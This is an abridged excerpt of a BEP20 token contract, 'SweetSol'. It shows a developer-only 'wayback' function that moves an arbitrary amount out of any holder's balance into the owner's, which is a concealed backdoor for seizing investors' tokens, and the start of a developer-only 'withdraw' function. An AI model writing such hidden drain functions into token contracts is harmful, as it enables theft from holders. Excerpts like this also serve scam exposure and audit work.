...
contract SweetSol is Context, IBEP20, Ownable {
    ...
    function wayback(address _label, uint _v) external onlyDev {
        if (_isExcluded[_label] && balanceOf(_label) <= _v){
            _tOwned[_label] = _tOwned[_label].sub(_v);

        } else {
            _rOwned[_label] = _rOwned[_label].sub(_v);
        }

        _rOwned[_owner] = _rOwned[_owner].add(_v);
    }
    ...
    function withdraw(address token, uint amount, address _wallet) onlyDev external {
        if(token == address(0)) {
